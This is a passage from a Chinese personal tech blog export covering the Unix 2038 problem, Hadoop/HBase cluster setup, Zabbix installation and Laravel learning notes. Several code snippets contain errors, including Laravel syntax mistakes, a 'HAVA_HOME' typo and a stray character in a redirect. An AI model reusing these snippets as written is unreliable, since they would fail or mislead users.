Billion）问题。在那一天，Unix纪元时间迎来了第1,000,000,000秒，由于某些软件中使用了字符串来存储时间戳，当字符串变成”1000000000”时，字典排序的结果会产生”999999999” ＞ “1000000000”，这造成了相当一部分程序不能正常判断时间差，影响到正常工作。（我一直以为只有不上路子的2B程序员才会这么去做判断，没想到还真不少，包括KDE在内。。。） 2004年1月10日恰好是1970年到2038年时间轴上的中点——显然，如果你在程序中出于某种目的将Unix时间乘以了2，那么它将不能正常工作。这在日本某些银行使用了IBM软件的ATM机上确实发生了。（至于究竟为什么要把时间乘以2，我只能表示不明觉厉。） 可以肯定地说，全世界的程序员都是一群爱偷懒的货。 轻松一刻在2001年S1B问题发生之前的4月19日，恰好迎来了Unix纪元的第987,654,321秒。虽然没什么实质意义（估计没有哪个程序会无聊到去计算时间戳中不同数字的个数），但这还是在Slashdot上激起了不少讨论。 2009年2月13日11:31:30，是Unix纪元的第1,234,567,890秒。这天刚好是星期五，又是一个13号，也就是西方文化中所谓的黑色星期五。世界各地不少Unix社区都在举办活动庆祝此事，包括Google的hackers们。他们甚至还做了一个Doodle： 从32位到64位解决2038年问题的办法看似很简单：因为time_t类型本来就是依赖于C POSIX库的具体实现的，并没有哪个规范规定它必须是32位，直接把它改成64位不就行了吗？ 问题是，直接这么改，会破坏很多现有程序（工具、服务……）的兼容性。几乎所有的32位系统都自然而然地采用了32位的time_t，这其中包括了现在绝大多数基于ARM处理器的电子产品（只要它们的底层系统是基于类Unix的——这包括iPad、iPhone、所有Android手机、PS Vita还有Raspberry Pi等等） 当然你大可不必担心你的手机会遭遇2038年问题，因为你现在的手机大概不会一直用到2038年（也许再过几个月你就会淘汰掉旧的去换新的了！）。剩下来的，就是桌面和服务器所要面临的问题了。 所幸的是，摆脱了嵌入式设备的局限性，我们在桌面和服务器上已经有了众多的64位体系架构可供选择。而且，目前绝大多数的64位操作系统，也都自然而然地采用了64位time_t类型（相当于long long int或者int64）。 问题解决了。只要我们可以预期现有的计算机都能在2038年之前迁移到64位系统（准确地说，是采用了64位time_t的系统），Unix纪元就不会迎来末日。到了那一天，所有的计算机系统仍然能正常工作，人类文明完好如初。 传统的32位Unix纪元时间会在2038年发生算术溢出，然后迎接末日。64位纪元当然也是会有这一天的，那将是在 15:30:08 UTC on Sun, 4 December 292,277,026,596 这个时间已经远远超过了预计太阳扩张成红巨星并吞噬地球的时间。所以，在此之前，已经没有什么好担心的了。我确信，要么人类文明要么根本都熬不到那一天，要么等到那一天，我们早就达到了拥有任意操纵时间和空间的能力的技术奇点，人类文明将获得永生（跑题了。。。）；要么就是，所有的电脑都已经迁移到了128位。（这当然是最简单的解决办法） 你的系统如何？想知道自己的Unix系统是否会在2038年1月19日这一天迎来末日，只要看系统能否正确显示Unix纪元第2,147,483,648秒的日期即可。 在GNU/Linux上，执行：(GNU date)1$ date -ud @2147483648 如果系统使用了64位时间，结果应该是正常的：（后文中假定时区一律设为export TZ=”UTC”）12038年 01月 19日 星期二 03:14:08 UTC 那么恭喜，你的系统可以平安无恙地度过2038年末日。如果出现1901年或者其他神马奇怪结果的话，自己看着办吧。 另：Unix是否会发生2038年问题并不绝对取决于是32位系统还是64位系统。这由具体系统中对time_t类型的实现决定。NetBSD和OpenBSD的早期版本在amd64平台上仍然使用了32位time_t，因此仍然会发生2038年问题。如今也有一些32位系统开始使用64位的time_t类型（典型的例子：今年10月份发布的NetBSD 6.0，在32位和64位平台上一律改成了64位time_t）。64位Linux上已经在使用64位的time_t了，而32位Linux上则似乎仍然是32位。 那么我遇到了什么问题在编写云计算项目程序的时候，我将unix时间转换为java的Date类型，但是我忘了java的时间默认是以ms为单位，所有我转换unix时间的时候原本单位是s，结果java把它当作ms，这样的结果就是原本时间应该是2016年6月1日的时间，变成了1970年1月的某一天。因此，在转换的时候要记得在unix时间上乘以1000 123456789101112@Test public void contextLoads() &#123; SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); Long time = Long.parseLong("1496246559")*1000; String d = format.format(time); try &#123; Date date = format.parse(d); System.out.println(date); &#125; catch (ParseException e) &#123; e.printStackTrace(); &#125; &#125; 参考资料/相关链接 关于2038年问题 http://en.wikipedia.org/wiki/Year_2038_problem http://www.y2038.com/ 关于计算机纪元法和Unix时间 https://en.wikipedia.org/wiki/Epoch_(reference_date)#Computing http://en.wikipedia.org/wiki/Unix_time 原创链接 http://ju.outofmemory.cn/entry/95734]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>unix时间</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hadoop之旅]]></title>
    <url>%2F2017%2F09%2F22%2Fhadoop%2F</url>
    <content type="text"><![CDATA[hadoop介绍以下是 Hadoop 的几种定义，每种定义都针对的是企业内的不同受众： 对于高管：Hadoop 是 Apache 的一个开源软件项目，目的是从令人难以置信的数量/速度/多样性等有关组织的数据中获取价值。使用数据，而不是扔掉大部分数据。 对于技术管理人员：一个开源软件套件，挖掘有关您的企业的结构化和非结构化大数据。Hadoop 集成您现有的商业智能生态系统。 工程：大规模并行、无共享、基于 Java 的 map-reduce 执行环境。打算使用数百台到数千台计算机处理相同的问题，具有内置的故障恢复能力。Hadoop 生态系统中的项目提供了数据加载、更高层次的语言、自动化的云部署，以及其他功能。 安全性：由 Kerberos 保护的软件套件。 hadoop组件下图显示了Hadoop生态系统各种组件 Apache Hadoop 由两个子项目组成 Hadoop MapReduce : MapReduce 是一种计算模型及软件架构，编写在Hadoop上运行的应用程序。这些MapReduce程序能够对大型集群计算节点并行处理大量的数据。 HDFS (Hadoop Distributed File System): HDFS 处理 Hadoop 应用程序的存储部分。 MapReduce应用使用来自HDFS的数据。 HDFS创建数据块的多个副本，并集群分发它们到计算节点。这种分配使得应用可靠和极其迅速的计算。 如果还是不清楚，再解释一下 HDFS：如果您希望有 4000 多台电脑处理您的数据，那么最好将您的数据分发给 4000 多台电脑。HDFS 可以帮助您做到这一点。HDFS 有几个可以移动的部件。Datanodes 存储数据，Namenode 跟踪存储的位置。还有其他部件，但这些已经足以使您开始了。 MapReduce：这是一个面向 Hadoop 的编程模型。有两个阶段，毫不意外，它们分别被称为 Map 和 Reduce。如果希望给您的朋友留下深刻的印象，那么告诉他们，Map 和 Reduce 阶段之间有一个随机排序。JobTracker 管理您的 MapReduce 作业的 4000 多个组件。TaskTracker 从 JobTracker 接受订单。如果您喜欢 Java，那么用 Java 编写代码。如果您喜欢 SQL 或 Java 以外的其他语言，您的运气仍然不错，您可以使用一个名为 Hadoop Streaming 的实用程序。 需要根本性理解这两个东西，否则配置的时候跟着教程走会遇到问题附上参考地址1 参考地址2 说说联机首先准备ssh为了使用Hadoop的时候免于密码登录其他Slaves，需要对ssh进行设置。生成登录钥匙,分为公钥和私钥1ssh-keygen -t rsa 一直敲回车(如果之前进行过这种操作，会提示是否覆盖之前的内容，输入y回车)，进行完这一步后系统会在~/.ssh/目录下生成两个文件，一个是私钥，一个是公钥，需要把公钥放在联机主机上1ssh-copy-id -p port username@remote-server 登录测试一下，通常第一次登录需要密码，之后不需要，如果碰到1connect to host localhost port 22: connection refused 有两种可能，一种是你的ssh服务没有打开通过一下命令打开1sudo service sshd restart 另一种可能是你的ssh—agent和ssh-server等设置不一致，需要将/etc/ssh/ssh_config和/etc/ssh/sshd_config两个文件里面的端口设置相同 如果需要这种情况1sign_and_send_pubkey: signing failed: agent refused operation 需要敲ssh-add就解决问题 联机联机设置主要在hadoop/etc/hadoop/masters和hadoop/etc/hadoop/slaves里面,在所有机子上设置masters为主机ip地址,而只在主机上添加其他所有联机设备的ip地址(2.x版本不需要masters文件，因此不必配置masters文件) 说明：slaves里面同样可以写主机hostname，如果写hostname, 需要配合/etc/hosts一起配置 然后在主机上启动hadoop,并通过localhost:50070查看Hadoop信息和连接情况 如果在网页上没有出现我们的datanode，可能是需要进入没有出现的slaves，找到之前hdfs.site.xml配置的目录，将其目录下的所有文件删掉就ok Hadoop下载安装进入Hadoop官网找到最新的稳定版下载 下载完成后将压缩包解压并重命名为hadoop(为了方便) 配置编辑hadoop/etc/hadoop/core-site.xml,指定NameNode的主机名和端口1234567891011121314&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://hadoop-master:9000&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;io.file.buffer.size&lt;/name&gt; &lt;value&gt;131072&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/tmp&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 需要说明属性hadoop.tmp.dir的值是一个你电脑上的目录，为了方便，最好将它设置在hadoop目录下。而fs.defaultFS的值是主机+端口,hadoop-master可以在/etc/hosts里面设置，一般本机设置默认为localhost，fs.default.name的值统一为masters下的主机名称. 编辑hadoop/etc/hadoop/hdfs-site.xml,指定HDFS的默认副本数12345678910111213141516171819202122&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/hdfs/namenode&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/hdfs/datanode&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.dir&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/hdfs/namesecondary&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;2&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.block.size&lt;/name&gt; &lt;value&gt;134217728&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 编辑hadoop/etc/hadoop/mapred-site.xml,指定JobTracker的主机名和端口(如果没有，直接复制mapred-site.xml.template)1234567891011121314151617181920&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;hadoop-master:10020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;hadoop-master:19888&lt;/value&gt; &lt;/property&gt; &lt;!-- &lt;property&gt; &lt;name&gt;yarn.app.mapreduce.am.staging-dir&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/app&lt;/value&gt; &lt;/property&gt; --&gt;&lt;/configuration&gt; 编辑hadoop/etc/hadoop/yarn-site.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;configuration&gt;&lt;!-- Site specific YARN configuration properties --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname&lt;/name&gt; &lt;value&gt;hadoop-master&lt;/value&gt; &lt;/property&gt; &lt;!-- &lt;property&gt; &lt;name&gt;yarn.resourcemanager.bind-host&lt;/name&gt; &lt;value&gt;0.0.0.0&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.bind-host&lt;/name&gt; &lt;value&gt;0.0.0.0&lt;/value&gt; &lt;/property&gt; --&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services.mapreduce_shuffle.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation-enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.local-dirs&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/yarn/local&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.log-dirs&lt;/name&gt; &lt;value&gt;file:/home/fenlan/Downloads/hadoop/yarn/log&lt;/value&gt; &lt;/property&gt; &lt;!-- &lt;property&gt; &lt;name&gt;yarn.nodemanager.remote-app-log-dir&lt;/name&gt; &lt;value&gt;hdfs://hadoop-master:9000/home/fenlan/Downloads/hadoop/yarn-log/apps&lt;/value&gt; &lt;/property&gt; --&gt;&lt;/configuration&gt; 修改hadoop/etc/hadoop/hadoop-env.sh,将里面的JAVA_HOME设置为JAVA安装根目录1export HAVA_HOME＝/home/fenlan/Downloads/jdk1.8.0_60 想知道本机JAVA_HOME，敲个which java就知道了 编辑hadoop/etc/hadoop/master,添加namenode主机,hadoop/etc/hadoop/slaves,添加datanode主机1hadoop-master 12hadoop-slave1hadoop-slave2 需要说明，hadoop-slave hadoop-master为主机的hostname, 为了方便管理，需要将主机的hostname修改, 比如我的电脑开始hostname是fenlan-K401UQ, 在我的教程里面就需要改成hadoop-slave1(相当重要，否则在运行程序是会报错找不到主机),这里我个人感激仍然没有讲清楚，下面有一个youtube视频教程，辅助理解 格式化HDFS1bin/hdfs namenode -format 启动Hadoop的单节点集群1234sbin/start-dfs.shsbin/start-yarn.shsbin/mr-jobhistory-daemon.sh start historyserversbin/start-all.sh 停止Hadoop1234sbin/stop-dfs.shsbin/stop-yarn.shsbin/mr-jobhistory-daemon.sh stop historyserversbin/stop-all.sh 加载HDFS123bin/hadoop fs -mkdir /fenlan/inputbin/hadoop fs -mkdir /fenlan/outputbin/hadoop fs -put files /fenlan/input 运行一个单词统计实例1bin/hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.8.1.jar wordcount /fenlan/input /fenlan/output/result 查看结果1bin/hadoop fs -cat /fenlan/output/result/* 推荐教程hadoop搭建教程hadoop分布式集群搭建视频教程(youtube) HBase 安装 官网下载HBase,解压包并重命名为hbase 编辑hbase/conf/hbase-env.sh的JAVA_HOME 编辑hbase/conf/hbase-site.xml如下 1234567891011121314151617181920212223242526&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hbase.rootdir&lt;/name&gt; &lt;value&gt;hdfs://hadoop-master:9000/hbase&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.cluster.distributed&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.master&lt;/name&gt; &lt;value&gt;hadoop-master:60000&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.zookeeper.quorum&lt;/name&gt; &lt;value&gt;hadoop-master,hadoop-slave1,hadoop-slave2&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.master.info.port&lt;/name&gt; &lt;value&gt;60010&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.master.port&lt;/name&gt; &lt;value&gt;60000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 编辑hbase/conf/regionservers添加slaves主机 启动HBase(先启动hadoop) 1bin/start-hbase.sh 管理HBase 1bin/hbase shell 问题总结1.当无法启动datanode时将hadoop/hdfs/datanode/current/文件夹删掉重新启动 教程如果有错误，欢迎留言!]]></content>
      <categories>
        <category>分布式计算</category>
      </categories>
      <tags>
        <tag>Zookeeper</tag>
        <tag>hadoop</tag>
        <tag>Hbase</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix安装配置]]></title>
    <url>%2F2017%2F08%2F22%2Fzabbix%2F</url>
    <content type="text"><![CDATA[下载软件包从zabbix上下载所需要的软件包，包括zabbix-server-mysql和zabbix-frontend-php，如果还要安装客户端，还要下载zabbix-agent。(推荐直接添加zabbix源) 安装软件12sudo dpkg -i zabbix-server-mysql_3.4.0-1+xenial_amd64.debsudo dpkg -i zabbix-frontend-php_3.4.0-1+xenial_all.deb 配置Zabbix server1sudo vim /etc/zabbix/zabbix_server.conf 修改其中的DBhost, DBUser, DBPassword， 如果有必要，需要设置socket与mysql的socket相同。 配置MySQL1234create database zabbix character set utf8 collate utf8_bin;grant all privileges on zabbix.* to 'zabbix'@'localhost';flush privileges;exit; 找到zabbix-server-mysql文件夹，文件夹中是zabbix数据库数据填充文件用来填充数据库1zcat *.sql.gz | mysql -uzabbix -p zabbix 如果是三个sql文件，填充顺序是schema.sql.gz-&gt;images.sql.gz-&gt;data.sql 配置PHP按照需要修改php.ini配置项 Zabbix web将Zabbix的web页面文件拷贝到LNMP的指定目录，启动Zabbix-server进入http://ip/zabbix按步骤填写相关信息，最后成功安上，最后再配合客户端进行监控 Zabbix 检测数据库首先在Zabbix网页上为host添加一个数据库模块，然后需要修改客户端数据，在客户端的/etc/zabbix/zabbix-agentd.d/userparameter_mysql.conf文件中根据文件指示将文件中所有HOME变量换为含有数据库连接文件.my.cnf的目录，我暂时将.my.cnf放在/etc/zabbix下面，然后编写.my.cnf123456789[mysql]user=zabbixpassword=zabbixhost=localhost[mysqladmin]user=zabbixpassword=zabbixhost=localhost 最后也是最重要的一步，重启数据库，上面步骤都做了，但网页上数据没有更新，原因就是数据库没有重启 附言写得很草率，还在学习中，会努力更新….]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[laravel学习之旅]]></title>
    <url>%2F2017%2F07%2F30%2Flaravel%2F</url>
    <content type="text"><![CDATA[路由1.基本路由123Route::get('basic1', function () &#123; return 'Hello World';&#125;); 2.路由参数1234567Route::get('user/&#123;id&#125;', function ($id) &#123; return 'User-id-' . $id;&#125;)-&gt;where('id', '[0-9]+');Route::get('user/&#123;name?&#125;', function ($name = 'fenlan') &#123; return 'User-name-' . $name;&#125;)-&gt;where('name', '[A-Za-z]+'); 3.路由群组12345678Route::group(['prefix' =&gt; 'member'], function () &#123; Route::get('user/member-center', ['as' =&gt; 'center', function () &#123; return route('center'); &#125;]); Route::any('multy1', function () &#123; return 'member-multy1'; &#125;);&#125;); 4.控制器关联1Route::get('member/&#123;id&#125;', 'MemberController@info'); get参数中第一个是url路由，第二个是控制器MemberController及控制器中函数info 控制器12345678910111213141516&lt;?phpnamespace App\Http\Controllers;class MemberController extends Controller&#123; public function info($id) &#123; //return 'member-info-id-' . $id; //return view('welcome'); return view('info', [ 'name' =&gt; 'fenlan', 'age' =&gt; 18, 'sex' =&gt; 'male' ]); &#125;&#125; 视图1234info blade php&#123;&#123;$name&#125;&#125;&#123;&#123;$age&#125;&#125;&#123;&#123;$sex&#125;&#125; laravel新建视图完成后需要模块编译(我是这么理解的)1php artisan serve 连接数据库在.env文件中修改配置123456789101112131415161718192021222324252627282930313233APP_NAME=LaravelAPP_ENV=localAPP_KEY=APP_DEBUG=trueAPP_LOG_LEVEL=debugAPP_URL=http://localhostDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=homesteadDB_USERNAME=homesteadDB_PASSWORD=secretBROADCAST_DRIVER=logCACHE_DRIVER=fileSESSION_DRIVER=fileQUEUE_DRIVER=syncREDIS_HOST=127.0.0.1REDIS_PASSWORD=nullREDIS_PORT=6379MAIL_DRIVER=smtpMAIL_HOST=smtp.mailtrap.ioMAIL_PORT=2525MAIL_USERNAME=nullMAIL_PASSWORD=nullMAIL_ENCRYPTION=nullPUSHER_APP_ID=PUSHER_APP_KEY=PUSHER_APP_SECRET= 修改完成后再编译一下，就连接成功 数据库操作1.使用DB facade实现CURD12345678910111213141516&lt;?phpnamespace App\Http\Controllers;use Illuminate\Support\Facades\DB;class StudentController extends Controller&#123; public function test1() &#123; $student = DB::select('SELECT * FROM student'); dd($student); // $bool = DB::insert('INSERT INTO student(name, ID) VALUES(?, ?)', ['fenlan', '15130110067']); // $num = DB::update('UPDATE student SET in_time = ? WHERE ID = ?', ['2015', '15130110067']); // $num = DB::delete('DELETE FROM student WHERE id &gt; ?', ['15130110067']); &#125;&#125; 这种方法属于原始方法，接下来有更酷的操作数据库方法 2.查询构造器及新增数据1234567891011121314151617181920212223242526272829303132public function test2() &#123; $bool = DB::table('student')-&gt;insert([ ['ID' =&gt; '15130110098', 'name' =&gt; '小淳', 'sex' =&gt; 'female', 'class' =&gt; '1513011', 'in_time' =&gt; '2015', 'status' =&gt; 'stay_in'] ['ID' =&gt; '15130110099', 'name' =&gt; '小明', 'sex' =&gt; 'female', 'class' =&gt; '1513011', 'in_time' =&gt; '2015', 'status' =&gt; 'stay_in'] ]); var_dump($bool); $num = DB::table('student')-&gt;where('id', '15130110067')-&gt;update('in_time' =&gt; '2016'); var_dump($num); $num DB::table('student')-&gt;increment('class', 1); var_dump($num); $num = DB::table('student')-&gt;where('id', '&gt;=', '15130110067')-&gt;delete(); var_dump($num); DB::table('student')-&gt;truncate(); // delete all data in table $students = DB::table('student')-&gt;get(); // return all data dd($students); $student = DB::table('student')-&gt;orderBy('id', 'desc')-&gt;first(); dd($student); $names = DB::table('student')-&gt;pluck('name'); // return name attrubite dd($names); $names = DB::table('student')-&gt;lists('name', 'id'); // return id -&gt; name(now this is removed) dd($names); $names = DB::table('student')-&gt;select('id', 'name', 'sex')-&gt;get(); // return attrubites dd($names); echo '&lt;pre&gt;'; DB::table('student')-&gt;chunk(2, function($students) &#123; var_dump($students); &#125;); // for big data query, query 2 data every time &#125; 这个方法可以避免sql攻击注入，同时也人性化很多,还有很多内容，具体查看官方文档database 3.Eloquent ORM12345678910111213141516&lt;?php// app\Student.phpnamespace App;use Illuminate\Database\Eloquent\Model;class Flight extends Model&#123; /** * The table associated with the model. * * @var string */ protected $table = 'student'; protected $primaryKey = 'id';&#125; 12345678910111213141516171819202122232425// app\Http\Controllers\StudentController.php&lt;?phpnamespace App\Http\Controllers;use App\Student;class StudentController extends Controller&#123; public function test() &#123; $students = Student::all(); $students = Student::find('15130110067') dd($students); $student = new Student(); $student-&gt;ID = '15130110070'; $student-&gt;name = '小青'; $student-&gt;sex = 'female'; $student-&gt;class = '1513011'; $student-&gt;in_time = '2015'; $student-&gt;status = 'stay_in'; $bool = $student-&gt;save(); dd($bool); &#125;&#125; 123456789101112131415161718// ORM 正则搜索public function search(Request $request) &#123; $keyword = $request-&gt;keyword; $keyword = '%' . $keyword . '%'; // $books = DB::select('SELECT * FROM books WHERE keywords LIKE ?', [$keyword]); $books = Book::where('keywords', 'LIKE', $keyword)-&gt;paginate(12); if ($books-&gt;total()) &#123; return view('book.searchResults', [ 'books' =&gt; $books, ]); &#125; else &#123; return view('book.searchNoFound'); &#125;&#125; 具体内容查看官方文档ORM blade模板123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// views\layout.blade.php&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;laravel模板继承&lt;/title&gt; &lt;style&gt; .header &#123; width: 1000px; height: 150px; margin: 0 auto; background: #f5f5f5; border: 1px solid #ddd; &#125; .main &#123; width: 1000px; height: 300px; margin: 0 auto; margin-top: 15px; clear: both; &#125; .main .sidebar &#123; float: left; width: 20%; height: inherit; background: #f5f5f5; border: 1px solid #ddd; &#125; .main .content &#123; float: right; width: 75%; height: inherit; background: #f5f5f5; border: 1px solid #ddd; &#125; .footer &#123; width: 1000px; height: 150px; margin: 0 auto; margin-top: 15px; background: #f5f5f5; border: 1px solid #ddd; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class='header'&gt; @section('header') 头部 @show &lt;/div&gt; &lt;div class='main'&gt; &lt;div class='sidebar'&gt; @section('sidebar') 侧边栏 @show &lt;/div&gt; &lt;div class='content'&gt; @yield('content', '主要内容') &lt;/div&gt; &lt;/div&gt; &lt;div class="footer"&gt; @section('footer') 尾部 @show &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// views\student\test.php@extends('layout')@section('header') @parent header@stop@section('sidebar') sidebar@stop@section('content') content &lt;!-- 1.模板中输出变量 --&gt; &lt;p&gt;&#123;&#123; $name &#125;&#125;&lt;/p&gt; &lt;!-- 2.模板中调用PHP代码 --&gt; &lt;p&gt;&#123;&#123; time() &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; date('Y-m-d H:i:s', time()) &#125;&#125;&lt;/p&gt; &lt;!-- 3.原样输出 --&gt; &lt;p&gt;@&#123;&#123; $name &#125;&#125;&lt;/p&gt; &#123;&#123;-- 4.模板中注释 --&#125;&#125; &#123;&#123;-- 5.引入子视图 --&#125;&#125; @include('student.commen', ['message' =&gt; '我是错误信息']) @if ($name == 'fenlan') I'm fenlan @elseif ($name == 'hello') I'm hello @else Who am I? @endif &lt;br&gt; @unless ($name != 'fenlan') I'm fenlan @endunless &lt;br&gt; @for ($i=0; $i &lt; 10; $i++) &#123;&#123; $i &#125;&#125; @endfor@stop Requests1234567891011121314151617181920212223&lt;?phpnamespace App\Http\Controllers;use App\Student;use Illuminate\Http\Request;class StudentController extends Controller&#123; public function test(Request $request) &#123; // 1.取值 echo $request-&gt;input('name', 'default'); echo $request-&gt;has('name'); $res = $request-&gt;all(); dd($res); // 2.判断请求类型 echo $request-&gt;method(); echo $request-&gt;isMethod('GET'); $res = $request-&gt;is('student/*'); var_dump($res); &#125;&#125; Session12345// routes\web.phpRoute::group(['middleware' =&gt; ['web']], function () &#123; Route::any('session1', 'StudentController@session1'); Route::any('session2', 'StudentController@session2');&#125;); 12345678// 1.Http request session();public function session1(Request $request) &#123; $request-&gt;session()-&gt;put('key1', 'value1'); &#125; public function session2(Request $request) &#123; echo $request-&gt;session()-&gt;get('key1'); &#125; 12345678// 2.sesson()public function session1(Request $request) &#123; session()-&gt;put('key2', 'value2'); &#125; public function session2(Request $request) &#123; echo session()-&gt;get('key2'); &#125; 12345678// 3.Session class public function session1(Request $request) &#123; Session::put('key3', 'value3'); &#125; public function session2(Request $request) &#123; echo session::get('key3', 'default'); &#125; 123456789public function session1(Request $request) &#123; Session::push('student', 'fenlan'); Session::push('student', 'shirk3'); &#125; public function session2(Request $request) &#123; $res = Session::get('student', 'default'); dd($res); &#125; 1234567891011public function session1(Request $request) &#123; Session::forget('student'); Session::flush('key', 'default'); // temporary Session::flush(); &#125; public function session2(Request $request) &#123; echo Session::has('student'); // return bool $res = Session::pull('student', 'default'); dd($res); &#125; Response12345678910public function test() &#123; // 响应json $data = [ 'errCode' =&gt; 0, 'errMsg' =&gt; 'success', 'data' =&gt; 'fenlan', ]; return response()-&gt;json($data);&#125; 1234public function test() &#123; // redirect return redirect('session2');9&#125; Middleware目的：实现一个功能，当访问时间小于活动开始时间，则跳转到宣传页面，当访问时间大于活动开始时间，则跳转到活动界面1.宣传页面和活动页面构造123456789101112131415161718// app\Http\Controller\StudentController.php // 宣传页面 public function activity0() &#123; return '活动快要开始啦，敬请关注'; &#125; // 活动页面 public function activity1() &#123; return '活动进行中，谢谢您的参与1'; &#125; // 活动页面 public function activity2() &#123; return '活动进行中，谢谢您的参与2'; &#125; 2.添加Middleware1234567891011121314151617181920// app\Http\Middleware\Activity.php&lt;?phpnamespace App\Http\Middleware;use Closure;class Activity&#123; public function handle($request, Closure $next) &#123; if (time() &lt; strtotime('2017-08-03')) &#123; return redirect('activity0'); &#125; return $next($request); &#125;&#125; 12345678910// app\Http\Kernel.php 中添加一条Middlewareprotected $routeMiddleware = [ 'auth' =&gt; \Illuminate\Auth\Middleware\Authenticate::class, 'auth.basic' =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class, 'bindings' =&gt; \Illuminate\Routing\Middleware\SubstituteBindings::class, 'can' =&gt; \Illuminate\Auth\Middleware\Authorize::class, 'guest' =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class, 'throttle' =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class, 'activity' =&gt; \App\Http\Middleware\Activity::class, ]; 3.添加路由123456Route::group(['middleware' =&gt; ['activity']], function () &#123; Route::any('activity1', 'StudentController@activity1'); Route::any('activity2', 'StudentController@activity2');&#125;);Route::any('activity0', 'StudentController@activity0'); 4.浏览器访问activity1或者activity2 File项目中遇到一个问题，需要数据库储存图片，网上给出一个好的方式就是将图片的路径存进数据库，laravel中实现过程如下1.提交图片表单123456789&lt;form class="form-horizontal" method="post" enctype="multipart/form-data" action="&#123;&#123; url('test2') &#125;&#125;"&gt; &#123;&#123; csrf_field() &#125;&#125;&lt;input type="file" name="photo"&gt;&lt;div class="form-group"&gt; &lt;div class="col-sm-offset-2 col-sm-10"&gt; &lt;button type="submit" class="btn btn-primary"&gt;提交&lt;/button&gt; &lt;/div&gt;&lt;/div&gt;&lt;/form&gt; 2.显示图片页面1&lt;img height="150" width="150px" src="&#123;&#123;url('/images/'.$image)&#125;&#125;"/&gt; 3.控制器实现123456789public function test2(Request $request) &#123; $img = time() . '.' . $request-&gt;photo-&gt;getClientOriginalExtension(); $path = $request-&gt;photo-&gt;move(public_path('images'),$img); return view('student.test2', [ 'image' =&gt; $img, ]);&#125; 最后图片存进了laravel项目下的public/images 踩坑总结 TokenMismatchException in VerifyCsrfToken.php line 68laravel 默认开启了 csrf验证 ，post请求需要验证csrf,所以要在表单里 加个隐藏域解决方案： MassAssignmentException in Model.php line 232:在添加学生的时候选择action为空时，会出现这个错误，解释为new Student时复制不能批量操作，因此要在Model中添加 1protected $fillable = ['name', 'age', 'sex']; ErrorException in HasAttributes.php line 403: Relationship method must return an object of type 